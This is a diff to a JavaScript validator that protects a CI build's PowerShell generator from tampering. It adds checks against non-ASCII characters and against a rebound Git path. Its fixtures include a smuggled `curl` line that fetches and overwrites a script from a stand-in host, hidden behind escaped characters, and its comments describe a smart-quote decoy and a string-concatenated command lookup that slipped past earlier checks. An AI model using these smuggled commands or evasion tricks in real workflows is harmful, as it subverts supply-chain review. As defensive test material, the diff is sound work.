@@ -318,7 +318,7 @@ const MARKDOWN_ACQUIRE = Object.freeze({
 // a silent one. This is a review signal rather than a runtime gate -- build.yml
 // does not run this validator, so what actually contains the generator at run
 // time is the process boundary and the byte comparison in that step.
-const REVIEWED_GENERATOR_DIGEST = 'c0d7ab8aaa0aff3fc5b4adca5da2707b6ce1b68117f31e7a741fb25144ddb308';
+const REVIEWED_GENERATOR_DIGEST = 'dd62e11eb4e2bb9a7a764febc074901c86811d25bb6fa5b50fa18f54b3bbc342';
 
 // The lint phases execute these two files out of the checkout. The rule
 // configuration decides which rules run at all, and the nested-fence helper is
@@ -497,7 +497,7 @@ const MARKDOWN_JOBS = Object.freeze({
   }),
 });
 
-const EXPECTED_VERSION = '1.0.20260802.2';
+const EXPECTED_VERSION = '1.0.20260802.3';
 const MAXIMUM_YAML_BYTES = 1024 * 1024;
 const MAXIMUM_NODE_COUNT = 10000;
 const MAXIMUM_DEPTH = 64;
@@ -2686,6 +2686,15 @@ const FIXTURE_INVENTORY = Object.freeze([
   // does not carry a raw backtick in a fixture string.
   ['T1-MARKDOWN-088', 'request hidden behind an escaped space before a hash', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Write-Host marker" + String.fromCharCode(96) + " #text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
   ['T1-MARKDOWN-089', 'request hidden behind an escaped tab before a hash', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Write-Host marker" + String.fromCharCode(96) + String.fromCharCode(9) + "#text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
+  // Round 50. Smart quotes are string delimiters to PowerShell but not to the
+  // projection, so this decoy stayed visible as code and satisfied both
+  // qualified-lookup presence checks while evaluating to a String. Built from
+  // fromCharCode so this file stays ASCII itself.
+  ['T1-GENERATOR-010', 'qualified lookup satisfied by a smart-quoted decoy', 'generator', (source) => replaceOnce(source, "    $strGitPath = $arrGitCommands[0].Source", "    $strDecoy = " + String.fromCharCode(0x201C) + "Microsoft.PowerShell.Core" + String.fromCharCode(92) + "Get-Command -Name 'git'" + String.fromCharCode(0x201D) + "\n    $strGitPath = $arrGitCommands[0].Source")],
+  // The approved lookup still runs; only its result stops being what is
+  // invoked. Every later & $strGitPath then resolves 'git' the ordinary way.
+  ['T1-GENERATOR-011', 'Git path rebound to a bare command name', 'generator', (source) => replaceOnce(source, "    $strGitPath = $arrGitCommands[0].Source", "    $strGitPath = 'git'")],
+  ['T1-GENERATOR-012', 'Git path reassigned after the qualified lookup', 'generator', (source) => replaceOnce(source, "    $arrTrackedPath = @(& $strGitPath", "    $strGitPath = 'git'\n    $arrTrackedPath = @(& $strGitPath")],
   ['T1-MARKDOWN-072', 'supply prelude closed twice, shortening the compared region', 'markdown', (source) => replaceOnce(source, "          $strGlobalConfigDirectory = [System.IO.Path]::GetDirectoryName($env:npm_config_globalconfig)\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n", "          $strGlobalConfigDirectory = [System.IO.Path]::GetDirectoryName($env:npm_config_globalconfig)\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n")],
   ['T1-LINTASSET-001', 'all rules disabled in the lint configuration', 'lint-asset', {
     '.markdownlint.jsonc': '{ "default": false }\n',
@@ -2931,6 +2940,9 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-MARKDOWN-087": "acquire-policy: markdown.policy.acquire references an executable script path",
   "T1-MARKDOWN-088": "acquire-policy: markdown.policy.acquire references an executable script path",
   "T1-MARKDOWN-089": "acquire-policy: markdown.policy.acquire references an executable script path",
+  "T1-GENERATOR-010": "supply-policy: the generator contains a character outside printable ASCII",
+  "T1-GENERATOR-011": "supply-policy: the generator does not take its Git path from the qualified lookup",
+  "T1-GENERATOR-012": "supply-policy: the generator does not assign its Git path exactly once",
   "T1-MARKDOWN-023": "markdown-policy: markdown.markdownlint.lint contains a workflow expression",
   "T1-MARKDOWN-022": "policy: markdown.markdownlint job permissions differs from the locked policy",
   "T1-LINTASSET-001": "supply-policy: .markdownlint.jsonc does not match its reviewed digest",
@@ -3187,6 +3199,27 @@ export function validateGeneratorPolicy(source) {
   if (!source.includes('Microsoft.PowerShell.Core\\Get-Command -Name \'git\'')) {
     reject('supply-policy', 'the generator does not resolve Git through a module-qualified lookup');
   }
+  // Round 50, and the same argument the governed script steps already settled:
+  // the projection recognises ASCII ' and " as string delimiters, and PowerShell
+  // also accepts the smart quotes U+2018/2019/201C/201D. A smart-quoted decoy
+  // therefore stayed *visible* as code and satisfied both presence checks above
+  // while never executing, leaving the real lookup free to be assembled --
+  // measured accepted, with the generator digest re-baselined:
+  //
+  //   $strDecoy = <smart>Microsoft.PowerShell.Core\Get-Command -Name 'git'<smart>
+  //   $arrGitCommands = @(& ('Get-' + 'Command') -Name 'git' ...)
+  //
+  // and `& ('Get-' + 'Command')` was confirmed to resolve /usr/bin/git while
+  // the decoy evaluates to a String. Adding four codepoints to the quote branch
+  // would fix that spelling and leave the class open -- homoglyphs, bidi
+  // overrides, non-breaking spaces -- which is exactly why the steps refuse
+  // non-ASCII outright rather than teaching the projection more delimiters. The
+  // generator now gets the same rule. Its only non-ASCII characters were four
+  // em-dashes in comments, rewritten as -- in the same commit, so no emitted
+  // byte moved and the four artifact digests are unchanged.
+  if (/[^\t\n\x20-\x7e]/u.test(source)) {
+    reject('supply-policy', 'the generator contains a character outside printable ASCII');
+  }
   // Case-insensitive: PowerShell command lookup is, and it was measured -- a
   // lowercase get-command resolved /usr/bin/git on 7.6.4. Without the flag a
   // generator could keep the qualified spelling to satisfy the presence checks
@@ -3196,6 +3229,25 @@ export function validateGeneratorPolicy(source) {
   // case-insensitively as well.
   if (/(?<!Microsoft\.PowerShell\.Core\\)Get-Command/iu.test(generatorCode)) {
     reject('supply-policy', 'the generator resolves a command through a shadowable lookup');
+  }
+  // Round 50. Everything above establishes that a qualified lookup *appears*
+  // and that no unqualified one does. None of it required the looked-up path to
+  // be the one actually invoked. Measured accepted, with the digest
+  // re-baselined: replacing the assignment with `$strGitPath = 'git'` leaves
+  // the approved call untouched and every later `& $strGitPath` then performs
+  // ordinary resolution -- which is precisely the shadowing the qualified
+  // lookup exists to prevent, with the policy reporting success.
+  //
+  // So the result is bound to the variable that is invoked. Exactly once,
+  // because a second assignment anywhere would leave the reviewed one intact
+  // and still decide what runs -- the same defect, and the same counting fix,
+  // as the captured phase statuses in the Markdown steps.
+  const arrGitPathAssignments = generatorCode.match(/\$strGitPath\s*=/gu) ?? [];
+  if (arrGitPathAssignments.length !== 1) {
+    reject('supply-policy', 'the generator does not assign its Git path exactly once');
+  }
+  if (!generatorCode.includes('$strGitPath = $arrGitCommands[0].Source')) {
+    reject('supply-policy', 'the generator does not take its Git path from the qualified lookup');
   }
   // Get-Command is not the only shadowable lookup. $ExecutionContext.InvokeCommand
   // resolves through the same session state -- including the function table that
